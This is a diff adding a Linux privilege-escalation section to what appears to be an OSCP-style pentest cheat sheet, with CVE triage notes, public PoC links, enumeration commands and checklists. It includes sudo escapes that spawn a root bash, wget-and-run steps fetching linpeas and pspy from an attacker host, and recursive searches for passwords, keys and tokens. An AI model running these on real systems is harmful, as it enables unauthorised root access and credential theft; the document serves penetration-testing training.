@@ -1,0 +1,1894 @@
+<h2 id="ref-12-privilege-escalation-linux-every-vector">12. PRIVILEGE ESCALATION --- LINUX (EVERY VECTOR)</h2>
+<details id="ref-12-1-copy-fail-cve-2026-31431">
+<summary>⚠ 12.1 Copy Fail --- CVE-2026-31431</summary>
+<ul>
+<li>Theori PoC: https://github.com/theori-io/copy-fail-CVE-2026-31431</li>
+<li>Alternate Python PoC:
+https://github.com/danielino/copy-fail-CVE-2026-31431/blob/main/copy_fail_exp.py</li>
+</ul>
+<p>Linux kernel local privilege escalation research/PoCs. Verify the exact
+kernel/distro build and prerequisites.</p>
+</details>
+<details id="ref-12-2-pkexec-pwnkit-cve-2021-4034">
+<summary>⚠ 12.2 pkexec / PwnKit --- CVE-2021-4034</summary>
+<p>Reference: https://github.com/ly4k/PwnKit</p>
+<pre class="ref-code"><code class="language-bash">which pkexec
+pkexec --version 2&gt;/dev/null
+dpkg -l policykit-1 2&gt;/dev/null
+rpm -q polkit 2&gt;/dev/null
+</code></pre>
+<p>Verify distro patch/backport status before assuming vulnerability.</p>
+</details>
+
+<details id="ref-12-2a-v16-high-yield-linux-lpe-pack">
+<summary>🔥 12.2A High-Yield Linux LPE Pack — 2023–2025 Before Exotic Kernel Research</summary>
+<p><span class="v16-ref-tier v16-ref-cond">● CONDITIONAL</span> These are recognition/triage cards. Exact distro package revisions and prerequisites override upstream banners.</p>
+
+<h3>CVE-2025-32463 — sudo <code>--chroot</code> LPE</h3>
+<div class="v16Cve high"><b>ACCESS: LOCAL · PRIV: LOW · RESULT: ROOT EoP</b><br>Affected upstream sudo 1.9.14 through 1.9.17; fixed in 1.9.17p1. The issue can cause sudo to load attacker-controlled NSS configuration/library data through a user-selected chroot during sudoers evaluation.</div>
+<pre class="ref-code"><code class="language-bash">sudo --version
+dpkg-query -W -f='${Package} ${Version}\n' sudo 2&gt;/dev/null
+rpm -q --qf '%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\n' sudo 2&gt;/dev/null</code></pre>
+<p>Primary: https://www.openwall.com/lists/oss-security/2025/06/30/3</p>
+
+<h3>CVE-2025-32462 — sudo <code>--host</code> rule bypass</h3>
+<div class="v16Cve"><b>ACCESS: LOCAL · PRIV: user listed in sudoers · RESULT: potential EoP</b><br>Affected upstream 1.8.8 through 1.9.17; fixed in 1.9.17p1. Relevant only when host-specific sudoers rules make another host more permissive. <code>ALL</code>-host rules do not create the special condition.</div>
+<pre class="ref-code"><code class="language-bash">sudo -l
+sudo -l -h &lt;OTHER_HOSTNAME&gt;  # validation only if a host-specific sudoers clue exists</code></pre>
+<p>Primary: https://www.openwall.com/lists/oss-security/2025/06/30/2</p>
+
+<h3>needrestart family — CVE-2024-48990 / 48991 / 48992 / 10224 / 11003</h3>
+<div class="v16Cve high"><b>ACCESS: LOCAL · PRIV: unprivileged user · RESULT: ROOT EoP</b><br>Qualys reported five needrestart LPE issues affecting versions before 3.8, with multiple interpreter/environment handling paths. Check the distro package revision and whether needrestart/interpreter scanning is actually present.</div>
+<pre class="ref-code"><code class="language-bash">command -v needrestart
+needrestart -v 2&gt;&amp;1 | head
+dpkg-query -W -f='${Package} ${Version}\n' needrestart 2&gt;/dev/null
+apt-cache policy needrestart 2&gt;/dev/null</code></pre>
+<p>Primary: https://blog.qualys.com/vulnerabilities-threat-research/2024/11/19/qualys-tru-uncovers-five-local-privilege-escalation-vulnerabilities-in-needrestart</p>
+
+<h3>CVE-2023-4911 — Looney Tunables / glibc <code>ld.so</code></h3>
+<div class="v16Cve"><b>ACCESS: LOCAL · PRIV: LOW · RESULT: ROOT EoP · COMPONENT: glibc dynamic loader</b><br>Qualys demonstrated local root on default Fedora, Ubuntu and Debian installations. Musl-based systems such as Alpine are outside that glibc path. Package backports matter.</div>
+<pre class="ref-code"><code class="language-bash">ldd --version 2&gt;&amp;1 | head
+dpkg-query -W -f='${Package} ${Version}\n' libc6 2&gt;/dev/null
+rpm -q --qf '%{NAME}-%{VERSION}-%{RELEASE}.%{ARCH}\n' glibc 2&gt;/dev/null</code></pre>
+<p>Primary: https://blog.qualys.com/vulnerabilities-threat-research/2023/10/03/cve-2023-4911-looney-tunables-local-privilege-escalation-in-the-glibcs-ld-so</p>
+
+<h3>CVE-2025-6018 + CVE-2025-6019 — PAM <code>allow_active</code> → libblockdev/udisks root chain</h3>
+<div class="v16Cve high"><b>ACCESS: LOCAL · RESULT: chained ROOT EoP</b><br>CVE-2025-6018 is a SUSE/openSUSE PAM path to <code>allow_active</code>; CVE-2025-6019 is a libblockdev/udisks LPE requiring <code>allow_active</code> context. Qualys demonstrated the second flaw across Ubuntu, Debian, Fedora and openSUSE, but the chain prerequisites differ by distro.</div>
+<pre class="ref-code"><code class="language-bash">cat /etc/os-release
+loginctl show-session "$XDG_SESSION_ID" 2&gt;/dev/null | grep -E 'Active|Remote|State'
+dpkg-query -W -f='${Package} ${Version}\n' udisks2 'libblockdev*' 2&gt;/dev/null
+rpm -q udisks2 libblockdev 2&gt;/dev/null
+systemctl status udisks2 --no-pager 2&gt;/dev/null</code></pre>
+<p>Primary: https://blog.qualys.com/vulnerabilities-threat-research/2025/06/17/qualys-tru-uncovers-chained-lpe-suse-15-pam-to-full-root-via-libblockdev-udisks</p>
+
+<h3>CVE-2024-6387 — regreSSHion</h3>
+<p><span class="v16-ref-tier v16-ref-last">! LAST RESORT</span> <strong>ACCESS: REMOTE unauthenticated · RESULT: potential root RCE · RELIABILITY: race/complex</strong>. Qualys identified vulnerable upstream OpenSSH ranges including 8.5p1 up to but not including 9.8p1 on glibc-based Linux, subject to distro fixes/backports. Treat this as a triage candidate, not a first-line OSCP exploit.</p>
+<pre class="ref-code"><code class="language-bash">ssh -V
+nmap -sV -p22 $IP
+# Then verify the exact distro package revision / vendor patch status.
+# Do NOT burn exam time on a race exploit while simpler evidence-backed paths remain.</code></pre>
+<p>Primary: https://www.qualys.com/regresshion-cve-2024-6387</p>
+</details>
+
+<details id="ref-12-3-ghostlock-smb-availability-research">
+<summary>⚠ 12.3 GhostLock --- SMB Availability Research</summary>
+<p>Reference: https://github.com/kimd155/ghostlock</p>
+<p><strong>Classification note:</strong> GhostLock is not a Linux LPE CVE; it is SMB
+availability research. Preserved here as requested.</p>
+</details>
+<details id="ref-12-4-dirtyfrag">
+<summary>⚠ 12.4 DirtyFrag</summary>
+<p>Reference: https://github.com/V4bel/dirtyfrag</p>
+<p>Preserved as a Linux kernel privilege-escalation research reference.
+Validate affected kernels and prerequisites.</p>
+</details>
+<details id="ref-12-5-dirtyclone-cve-2026-43503">
+<summary>⚠ 12.5 DirtyClone --- CVE-2026-43503</summary>
+<p>Reference: https://github.com/entra1337/DirtyClone</p>
+<p>Python PoC for Linux kernel LPE via page-cache corruption. Verify exact
+affected kernel/build and prerequisites.</p>
+</details>
+<details id="ref-12-6-bad-epoll">
+<summary>⚠ 12.6 Bad-epoll</summary>
+<p>Reference: https://github.com/J-jaeyoung/bad-epoll</p>
+<p>Preserved as a kernel exploitation research reference. Confirm affected
+versions and prerequisites.</p>
+</details>
+<details id="ref-12-7-fragnesia">
+<summary>⚠ 12.7 Fragnesia</summary>
+<p>Reference:
+https://github.com/v12-security/pocs/blob/main/fragnesia%2FREADME.md</p>
+<p>Validate affected kernel versions, configuration and prerequisites.</p>
+</details>
+<details id="ref-12-8-ovswrap-cve-2026-64531">
+<summary>⚠ 12.8 OVSwrap --- CVE-2026-64531</summary>
+<p>Reference: https://github.com/HackSpeak/CVE-2026-64531</p>
+<p>Linux kernel Open vSwitch LPE research PoC. Verify the required Open
+vSwitch/kernel functionality is present.</p>
+</details>
+<details id="ref-12-9-pack2theroot-cve-2026-41651">
+<summary>⚠ 12.9 Pack2TheRoot --- CVE-2026-41651</summary>
+<p>Reference: https://github.com/shibaaa204/Pack2TheRoot.git</p>
+<p>PackageKit LPE PoC. Verify the exact PackageKit version/configuration.</p>
+</details>
+<details id="ref-12-10-sudo-wget-privilege-escalation">
+<summary>⚠ 12.10 sudo wget Privilege Escalation</summary>
+<p>Reference:
+https://morgan-bin-bash.gitbook.io/linux-privilege-escalation/sudo-wget-privilege-escalation</p>
+<pre class="ref-code"><code class="language-bash">sudo -l
+</code></pre>
+<p>Determine what file/network operations the allowed <code>wget</code> invocation
+permits in the specific sudoers configuration.</p>
+</details>
+<blockquote>
+<p><strong>Method:</strong> enumerate → validate ownership/permissions → identify
+execution path → check prerequisites → exploit → re-enumerate.</p>
+</blockquote>
+<details id="ref-12-11-linux-privesc-situational-awareness-always-start-here">
+<summary>➜ 12.11 Linux PrivEsc Situational Awareness --- ALWAYS START HERE</summary>
+<pre class="ref-code"><code class="language-bash">id
+whoami
+groups
+hostname
+uname -a
+uname -r
+cat /etc/os-release
+cat /proc/version
+cat /proc/cmdline
+cat /proc/1/cgroup
+systemd-detect-virt 2&gt;/dev/null
+
+ip addr
+ip route
+cat /etc/hosts
+cat /etc/resolv.conf
+ss -lntup
+ps auxww
+mount
+findmnt
+lsblk
+</code></pre>
+<p>Check:</p>
+<ul>
+<li>[ ] Physical host / VM / Docker / LXC / LXD</li>
+<li>[ ] Exact distro + package revision</li>
+<li>[ ] Kernel + architecture</li>
+<li>[ ] AppArmor / SELinux</li>
+<li>[ ] Root-owned services/scripts</li>
+<li>[ ] Internal listeners/routes</li>
+<li>[ ] Mounted NFS/CIFS shares</li>
+<li>[ ] Secrets in environment/process arguments</li>
+<li>[ ] Cron + systemd timers</li>
+<li>[ ] SUID/SGID + capabilities</li>
+</ul>
+<pre class="ref-code"><code class="language-bash">aa-status 2&gt;/dev/null
+getenforce 2&gt;/dev/null
+sestatus 2&gt;/dev/null
+env | sort
+systemctl list-units --type=service --state=running
+systemctl list-timers --all
+</code></pre>
+</details>
+<details id="ref-12-12-automated-enumeration-run-then-manually-validate">
+<summary>⚙ 12.12 Automated Enumeration --- Run, Then Manually Validate</summary>
+<pre class="ref-code"><code class="language-bash"># LinPEAS
+wget http://$LHOST/linpeas.sh -O /tmp/linpeas.sh
+chmod +x /tmp/linpeas.sh
+/tmp/linpeas.sh | tee /tmp/linpeas.txt
+
+# Linux Smart Enumeration
+wget http://$LHOST/lse.sh -O /tmp/lse.sh
+chmod +x /tmp/lse.sh
+/tmp/lse.sh -l 2 | tee /tmp/lse.txt
+
+# pspy — essential for observing root jobs
+wget http://$LHOST/pspy64 -O /tmp/pspy
+chmod +x /tmp/pspy
+/tmp/pspy | tee /tmp/pspy.log
+
+# Linux Exploit Suggester
+./linux-exploit-suggester.sh
+
+# unix-privesc-check
+./unix-privesc-check standard
+</code></pre>
+<p><strong>Rule:</strong> a red LinPEAS finding is a lead, not proof. Verify the actual
+file owner, ACL, process, version, configuration and execution context.</p>
+</details>
+<details id="ref-12-13-sudo-configuration-escapes-cves">
+<summary>🔐 12.13 Sudo --- Configuration, Escapes &amp; CVEs</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE</strong> · ✓ FIRST CHOICE · <code>[REQ:LOCAL_SHELL]</code></p>
+</blockquote>
+<p><code>[LINUX:SUDO]</code></p>
+<pre class="ref-code"><code class="language-bash">sudo -l
+sudo -V
+sudo -ll
+cat /etc/sudoers 2&gt;/dev/null
+ls -la /etc/sudoers.d 2&gt;/dev/null
+</code></pre>
+<p>Check:</p>
+<ul>
+<li>[ ] <code>NOPASSWD</code></li>
+<li>[ ] Wildcards</li>
+<li>[ ] Dangerous interpreters</li>
+<li>[ ] User-controlled arguments</li>
+<li>[ ] <code>SETENV</code></li>
+<li>[ ] <code>env_keep</code></li>
+<li>[ ] <code>LD_PRELOAD</code></li>
+<li>[ ] <code>PYTHONPATH</code>, <code>PERL5LIB</code>, <code>RUBYLIB</code></li>
+<li>[ ] Writable scripts/configs invoked by allowed commands</li>
+</ul>
+<p>GTFOBins: https://gtfobins.github.io/</p>
+<p>Common sudo escape checks when the exact sudo rule permits them:</p>
+<pre class="ref-code"><code class="language-bash">sudo find . -exec /bin/bash \; -quit
+sudo vim -c ':!/bin/bash'
+sudo python3 -c 'import os; os.system("/bin/bash")'
+sudo perl -e 'exec "/bin/bash";'
+sudo ruby -e 'exec "/bin/bash"'
+sudo awk 'BEGIN {system("/bin/bash")}'
+sudo env /bin/bash
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+</code></pre>
+<h3>Sudo CVE references</h3>
+<ul>
+<li><strong>CVE-2021-3156 --- Baron Samedit:</strong> verify exact sudo
+version/package patch level.</li>
+<li><strong>CVE-2019-14287:</strong> only relevant to specific sudoers configurations
+and affected versions.</li>
+</ul>
+<p>Do not use upstream version strings alone; distro backports matter.</p>
+</details>
+<details id="ref-12-14-suid-sgid-binaries">
+<summary>! 12.14 SUID / SGID Binaries</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE</strong> · ✓ FIRST CHOICE · <code>[REQ:LOCAL_SHELL]</code></p>
+</blockquote>
+<p><code>[LINUX:SUID]</code></p>
+<pre class="ref-code"><code class="language-bash">find / -perm -4000 -type f 2&gt;/dev/null
+find / -perm -2000 -type f 2&gt;/dev/null
+find / -perm /6000 -type f 2&gt;/dev/null
+</code></pre>
+<p>For every unusual/custom binary:</p>
+<pre class="ref-code"><code class="language-bash">ls -la /path/to/binary
+file /path/to/binary
+strings /path/to/binary
+ldd /path/to/binary
+readelf -d /path/to/binary
+strace -f -e trace=execve,openat /path/to/binary 2&gt;&amp;1
+ltrace /path/to/binary 2&gt;&amp;1
+</code></pre>
+<p>Ask:</p>
+<pre class="ref-code"><code class="language-text">Does it execute another program without an absolute path?
+Does it load a writable library?
+Does it read a writable config?
+Does it follow attacker-controlled symlinks?
+Does it use predictable temporary files?
+Does it parse attacker-controlled input?
+</code></pre>
+<p>Reference: https://gtfobins.github.io/</p>
+</details>
+<details id="ref-12-15-writable-files-directories-ownership">
+<summary>✏️ 12.15 Writable Files, Directories &amp; Ownership</summary>
+<p><code>[LINUX:WRITABLE]</code></p>
+<pre class="ref-code"><code class="language-bash">find / -writable -type f 2&gt;/dev/null
+find / -writable -type d 2&gt;/dev/null
+
+ls -la /etc/passwd /etc/shadow /etc/sudoers 2&gt;/dev/null
+find /etc /opt /usr/local /var/www /var/backups -writable -ls 2&gt;/dev/null
+</code></pre>
+<p>Prioritize:</p>
+<pre class="ref-code"><code class="language-text">/etc/passwd
+/etc/shadow
+/etc/sudoers
+/etc/sudoers.d/*
+/etc/cron*
+/etc/systemd/*
+/etc/init.d/*
+/opt/*
+/usr/local/*
+/var/www/*
+root-owned scripts
+root-owned configuration
+service EnvironmentFile
+</code></pre>
+<h3>File ownership decision tree</h3>
+<pre class="ref-code"><code class="language-text">ROOT EXECUTES FILE
+       |
+       +-- Can I modify the file?
+       |       +-- YES → direct execution path
+       |
+       +-- Can I modify its parent directory?
+       |       +-- YES → replacement/symlink/path attack
+       |
+       +-- Does it load another object?
+       |       +-- YES → library/config/module hijack
+       |
+       +-- Does it create/use a predictable temporary file?
+               +-- YES → symlink/TOCTOU investigation
+</code></pre>
+</details>
+<details id="ref-12-16-cron-timers-scheduled-jobs">
+<summary>⏰ 12.16 Cron, Timers &amp; Scheduled Jobs</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE</strong> · ✓ FIRST CHOICE when privileged dependency is writable · <code>[REQ:LOCAL_SHELL] [REQ:WRITE_ACCESS] [REQ:TRIGGER]</code></p>
+</blockquote>
+<p><code>[LINUX:CRON]</code></p>
+<pre class="ref-code"><code class="language-bash">cat /etc/crontab
+ls -la /etc/cron.d
+ls -la /etc/cron.daily
+ls -la /etc/cron.hourly
+ls -la /etc/cron.weekly
+crontab -l 2&gt;/dev/null
+</code></pre>
+<p>Use pspy:</p>
+<pre class="ref-code"><code class="language-bash">./pspy64
+</code></pre>
+<p>Check:</p>
+<ul>
+<li>[ ] Root-owned script writable</li>
+<li>[ ] Parent directory writable</li>
+<li>[ ] Relative executable</li>
+<li>[ ] Weak PATH</li>
+<li>[ ] Wildcard expansion</li>
+<li>[ ] User-controlled environment</li>
+<li>[ ] Predictable temp file</li>
+<li>[ ] Symlink/TOCTOU</li>
+<li>[ ] Backup/archive command</li>
+</ul>
+<p>Also check systemd timers in <strong>12.19</strong>.</p>
+</details>
+<details id="ref-12-17-path-hijacking">
+<summary>🛤️ 12.17 PATH Hijacking</summary>
+<p><code>[LINUX:PATH]</code></p>
+<p>Find relative execution:</p>
+<pre class="ref-code"><code class="language-bash">strings /path/to/binary | grep -v '/'
+strace -f -e trace=execve /path/to/binary 2&gt;&amp;1
+ltrace /path/to/binary 2&gt;&amp;1
+</code></pre>
+<p>Then determine:</p>
+<pre class="ref-code"><code class="language-text">Which executable is resolved?
+Who executes it?
+What PATH is used?
+Can an earlier PATH directory be written?
+Can the privileged process be triggered?
+</code></pre>
+<p>Do not modify PATH blindly; first establish the exact execution context.</p>
+</details>
+<details id="ref-12-18-linux-capabilities">
+<summary>⚡ 12.18 Linux Capabilities</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE</strong> · ✓ FIRST CHOICE when capability semantics match · <code>[REQ:LOCAL_SHELL]</code></p>
+</blockquote>
+<p><code>[LINUX:CAPABILITIES]</code></p>
+<pre class="ref-code"><code class="language-bash">getcap -r / 2&gt;/dev/null
+capsh --print
+cat /proc/self/status | grep Cap
+</code></pre>
+<p>Prioritize:</p>
+<pre class="ref-code"><code class="language-text">cap_setuid
+cap_dac_read_search
+cap_dac_override
+cap_fowner
+cap_sys_admin
+cap_sys_ptrace
+cap_net_raw
+</code></pre>
+<p>Validate the binary and capability semantics before attempting
+exploitation.</p>
+<p>Reference: https://gtfobins.github.io/</p>
+</details>
+<details id="ref-12-19-systemd-services-timers">
+<summary>⚙️ 12.19 Systemd, Services &amp; Timers</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE</strong> · ✓ FIRST CHOICE when privileged dependency is writable · <code>[REQ:LOCAL_SHELL] [REQ:WRITE_ACCESS] [REQ:TRIGGER]</code></p>
+</blockquote>
+<p><code>[LINUX:SYSTEMD]</code></p>
+<pre class="ref-code"><code class="language-bash">systemctl list-units --type=service --state=running
+systemctl list-timers --all
+systemctl list-unit-files
+systemctl cat &lt;service&gt;
+systemctl status &lt;service&gt;
+</code></pre>
+<p>Check:</p>
+<ul>
+<li>[ ] Writable unit file</li>
+<li>[ ] Writable <code>ExecStart</code> target</li>
+<li>[ ] Writable <code>EnvironmentFile</code></li>
+<li>[ ] Writable <code>WorkingDirectory</code></li>
+<li>[ ] Relative executable</li>
+<li>[ ] Writable script/binary</li>
+<li>[ ] Writable parent directory</li>
+<li>[ ] Timer executes attacker-controlled content</li>
+<li>[ ] Service restart/start permissions</li>
+</ul>
+<pre class="ref-code"><code class="language-bash">find /etc/systemd /lib/systemd /usr/lib/systemd -writable -ls 2&gt;/dev/null
+</code></pre>
+</details>
+<details id="ref-12-20-nfs-rpc-network-filesystems">
+<summary>🌐 12.20 NFS / RPC / Network Filesystems</summary>
+<p><code>[LINUX:NFS]</code></p>
+<pre class="ref-code"><code class="language-bash">cat /etc/exports 2&gt;/dev/null
+showmount -e &lt;TARGET&gt;
+rpcinfo -p &lt;TARGET&gt;
+mount
+findmnt
+</code></pre>
+<p>Look for:</p>
+<pre class="ref-code"><code class="language-text">no_root_squash
+rw
+insecure
+writable exports
+unexpected mounts
+</code></pre>
+<p>If a writable export exists, determine whether the trust model permits
+creation/modification of a privileged file.</p>
+</details>
+<details id="ref-12-21-ssh-credentials-secrets">
+<summary>🔑 12.21 SSH, Credentials &amp; Secrets</summary>
+<p><code>[LINUX:CREDS]</code></p>
+<pre class="ref-code"><code class="language-bash">find /home /root -maxdepth 3 -type f \( \
+  -name 'id_*' -o \
+  -name 'authorized_keys' -o \
+  -name '*.pem' -o \
+  -name '*.key' -o \
+  -name '.bash_history' -o \
+  -name '.zsh_history' \
+\) -ls 2&gt;/dev/null
+</code></pre>
+<p>Search application/config locations:</p>
+<pre class="ref-code"><code class="language-bash">grep -RniE 'password|passwd|secret|token|api[_-]?key|private[_-]?key' \
+  /home /opt /var/www /etc 2&gt;/dev/null
+</code></pre>
+<p>Check:</p>
+<pre class="ref-code"><code class="language-text">~/.ssh/
+~/.aws/
+~/.config/
+~/.docker/
+.git/config
+.env
+backup archives
+database configuration
+CI/CD configuration
+shell history
+</code></pre>
+</details>
+<details id="ref-12-22-processes-proc-ipc-secrets-in-memory">
+<summary>★ 12.22 Processes, /proc, IPC &amp; Secrets in Memory</summary>
+<p><code>[LINUX:PROCESSES]</code></p>
+<pre class="ref-code"><code class="language-bash">ps auxww
+ps -ef
+ss -lntup
+
+cat /proc/&lt;PID&gt;/cmdline
+cat /proc/&lt;PID&gt;/environ 2&gt;/dev/null
+cat /proc/&lt;PID&gt;/status
+ls -la /proc/&lt;PID&gt;/fd 2&gt;/dev/null
+</code></pre>
+<p>Investigate:</p>
+<ul>
+<li>[ ] Root process uses writable script</li>
+<li>[ ] Credentials in arguments</li>
+<li>[ ] Secrets in environment</li>
+<li>[ ] Debug endpoints</li>
+<li>[ ] UNIX sockets</li>
+<li>[ ] D-Bus services</li>
+<li>[ ] Shared temp files</li>
+</ul>
+</details>
+<details id="ref-12-23-d-bus-polkit-packagekit">
+<summary>🔌 12.23 D-Bus, Polkit &amp; PackageKit</summary>
+<p><code>[LINUX:POLKIT]</code></p>
+<pre class="ref-code"><code class="language-bash">busctl --system list 2&gt;/dev/null
+systemctl status polkit 2&gt;/dev/null
+systemctl status packagekit 2&gt;/dev/null
+pkcheck --version 2&gt;/dev/null
+</code></pre>
+<p>Check:</p>
+<ul>
+<li>[ ] PackageKit installed</li>
+<li>[ ] Exact PackageKit version</li>
+<li>[ ] Polkit installed</li>
+<li>[ ] Exposed privileged D-Bus actions</li>
+<li>[ ] Current user can invoke relevant actions</li>
+<li>[ ] Exact CVE prerequisites satisfied</li>
+</ul>
+<h3>2026 CVE</h3>
+<p><strong>CVE-2026-41651 --- PackageKit:</strong> NVD describes a TOCTOU issue in
+PackageKit 1.0.2 through 1.3.4 that can allow an unprivileged local user
+to install packages as root; patched in 1.3.5.</p>
+<p>Reference: https://nvd.nist.gov/vuln/detail/CVE-2026-41651</p>
+</details>
+<details id="ref-12-24-snap-apparmor-security-frameworks">
+<summary>📦 12.24 Snap, AppArmor &amp; Security Frameworks</summary>
+<p><code>[LINUX:SNAP]</code></p>
+<pre class="ref-code"><code class="language-bash">snap version 2&gt;/dev/null
+snap list 2&gt;/dev/null
+aa-status 2&gt;/dev/null
+getenforce 2&gt;/dev/null
+sestatus 2&gt;/dev/null
+</code></pre>
+<h3>2026 Snapd CVEs to triage</h3>
+<ul>
+<li><strong>CVE-2026-3888:</strong> snapd local privilege escalation; verify Ubuntu
+release and snapd version.</li>
+<li><strong>CVE-2026-8933:</strong> snap-confine privilege escalation affecting
+specific set-capabilities configurations; verify exact
+snapd/snap-confine version and configuration.</li>
+<li><strong>CVE-2026-15226:</strong> snap sandbox confinement issue involving setuid
+execution flags; relevant to affected snapd versions and sandbox
+context.</li>
+</ul>
+<p>References:</p>
+<ul>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-3888</li>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-8933</li>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-15226</li>
+</ul>
+</details>
+<details id="ref-12-25-containers-docker-lxc-lxd">
+<summary>🐳 12.25 Containers, Docker, LXC &amp; LXD</summary>
+<blockquote>
+<p>✅ <strong>EXAM-COMPATIBLE MANUAL PATH</strong> · △ validate actual host-resource control · <code>[REQ:LOCAL_SHELL]</code></p>
+</blockquote>
+<p><code>[LINUX:CONTAINER]</code></p>
+<pre class="ref-code"><code class="language-bash">ls -la /.dockerenv 2&gt;/dev/null
+cat /proc/1/cgroup
+systemd-detect-virt 2&gt;/dev/null
+docker version 2&gt;/dev/null
+docker ps 2&gt;/dev/null
+ls -la /var/run/docker.sock 2&gt;/dev/null
+id
+</code></pre>
+<p>Check:</p>
+<pre class="ref-code"><code class="language-text">docker group
+docker.sock permissions
+privileged container
+host PID namespace
+host filesystem mounts
+CAP_SYS_ADMIN
+CAP_SYS_PTRACE
+device access
+LXC/LXD group membership
+</code></pre>
+<p>Key question:</p>
+<blockquote>
+<p><strong>What host resources does this container identity control?</strong></p>
+</blockquote>
+</details>
+<details id="ref-12-26-wildcards-symlinks-toctou">
+<summary>🔗 12.26 Wildcards, Symlinks &amp; TOCTOU</summary>
+<p><code>[LINUX:TOCTOU]</code></p>
+<h3>Wildcards</h3>
+<pre class="ref-code"><code class="language-text">Privileged command
+      ↓
+Shell expands *
+      ↓
+Attacker can create option-like filename?
+      ↓
+Program interprets it as an option?
+</code></pre>
+<p>Inspect:</p>
+<pre class="ref-code"><code class="language-text">tar
+rsync
+cp
+mv
+chown
+chmod
+zip
+7z
+git
+find
+</code></pre>
+<h3>Symlink</h3>
+<pre class="ref-code"><code class="language-text">Privileged process
+      ↓
+Predictable path
+      ↓
+Attacker controls parent/file
+      ↓
+Can symlink redirect target?
+</code></pre>
+<h3>TOCTOU</h3>
+<pre class="ref-code"><code class="language-text">check()
+   ↓
+time gap
+   ↓
+use()
+</code></pre>
+<p>If the attacker can change the object between check and use, investigate
+a race condition.</p>
+</details>
+<details id="ref-12-27-application-language-plugin-hijacking">
+<summary>◆ 12.27 Application / Language / Plugin Hijacking</summary>
+<p><code>[LINUX:PLUGIN]</code></p>
+<p>Check:</p>
+<pre class="ref-code"><code class="language-bash">env | sort
+echo "$PATH"
+find / -name '*.so' -writable 2&gt;/dev/null
+find / -writable -type d 2&gt;/dev/null
+</code></pre>
+<p>Look for:</p>
+<pre class="ref-code"><code class="language-text">LD_PRELOAD
+LD_LIBRARY_PATH
+RPATH
+RUNPATH
+PYTHONPATH
+PERL5LIB
+RUBYLIB
+Node module paths
+Java classpath
+plugin directories
+application-specific module loaders
+</code></pre>
+<p>ELF:</p>
+<pre class="ref-code"><code class="language-bash">readelf -d /path/to/binary | grep -E 'RPATH|RUNPATH|NEEDED'
+ldd /path/to/binary
+</code></pre>
+</details>
+<details id="ref-12-28-kernel-driver-package-cve-triage">
+<summary>▣ 12.28 Kernel / Driver / Package CVE Triage</summary>
+<blockquote>
+<p>✅ <strong>MANUAL EXPLOITATION MAY BE EXAM-COMPATIBLE</strong> · ! LAST RESORT · <code>[REQ:LOCAL_SHELL] [REQ:EXACT_BUILD] [REQ:CONFIG] [REQ:SAFE_RECOVERY]</code></p>
+</blockquote>
+<p><code>[LINUX:KERNEL]</code></p>
+<pre class="ref-code"><code class="language-bash">uname -a
+uname -r
+cat /etc/os-release
+cat /proc/version
+cat /boot/config-$(uname -r) 2&gt;/dev/null
+dpkg -l 2&gt;/dev/null | head
+rpm -qa 2&gt;/dev/null | head
+</code></pre>
+<p>Decision tree:</p>
+<pre class="ref-code"><code class="language-text">Exact distro/build
+      ↓
+Exact kernel/package revision
+      ↓
+Architecture
+      ↓
+Required feature/module/config
+      ↓
+Mitigations
+      ↓
+Public reproducer
+      ↓
+Local exploitability
+</code></pre>
+<p><strong>Do not use:</strong></p>
+<pre class="ref-code"><code class="language-text">"Kernel is in vulnerable range" = "exploit will work"
+</code></pre>
+<p>Distro backports and configuration frequently change exploitability.</p>
+<h3>2026 Linux LPE/CVE references</h3>
+<hr/>
+<p>CVE                    Component              Why it belongs in the
+checklist</p>
+<hr/>
+<p>CVE-2026-41651         PackageKit             Local root via
+PackageKit TOCTOU</p>
+<p>CVE-2026-3888          snapd                  Ubuntu local privilege
+escalation</p>
+<p>CVE-2026-8933          snap-confine           Configuration-specific
+local privilege
+escalation</p>
+<p>CVE-2026-15226         snapd/snap-confine     Sandbox confinement
+bypass</p>
+<p>CVE-2026-0271          Prisma Access Agent    Linux local privilege
+escalation if product is
+installed</p>
+<p>CVE-2026-58302         LinuxCNC <code>rtapi_app</code>   SUID-root shared-library
+loading leading to local
+root</p>
+<h2>CVE-2026-43433         Linux kernel Binder    Not a standalone LPE;
+requires another Binder
+bug/primitive; reference
+only until prerequisites
+are proven</h2>
+<p>References:</p>
+<ul>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-41651</li>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-3888</li>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-8933</li>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-15226</li>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-0271</li>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-58302</li>
+<li>https://nvd.nist.gov/vuln/detail/CVE-2026-43433</li>
+</ul>
+</details>
+<details id="ref-12-29-kernel-exploit-decision-rule">
+<summary>⚗ 12.29 Kernel Exploit Decision Rule</summary>
+<p>Before compiling/running a kernel exploit:</p>
+<ul>
+<li>[ ] Exact kernel version confirmed</li>
+<li>[ ] Exact distro/build confirmed</li>
+<li>[ ] Architecture confirmed</li>
+<li>[ ] Required kernel feature present</li>
+<li>[ ] Required module present</li>
+<li>[ ] Exploit prerequisites satisfied</li>
+<li>[ ] Mitigations considered</li>
+<li>[ ] Public PoC/reproducer matches target</li>
+<li>[ ] Non-kernel paths already checked</li>
+<li>[ ] Recovery plan exists if the kernel crashes</li>
+</ul>
+<p><strong>OSCP rule:</strong> a reliable service/configuration privilege escalation is
+normally preferable to a fragile kernel exploit.</p>
+</details>
+<details id="ref-12-30-linux-privesc-decision-tree-60-second-pass">
+<summary>★ 12.30 Linux PrivEsc Decision Tree --- 60 Second Pass</summary>
+<p><code>[LINUX:TREE]</code></p>
+<pre class="ref-code"><code class="language-text">LOW PRIV USER
+    ↓
+sudo -l
+    ↓
+SUID/SGID
+    ↓
+Capabilities
+    ↓
+Writable files/dirs
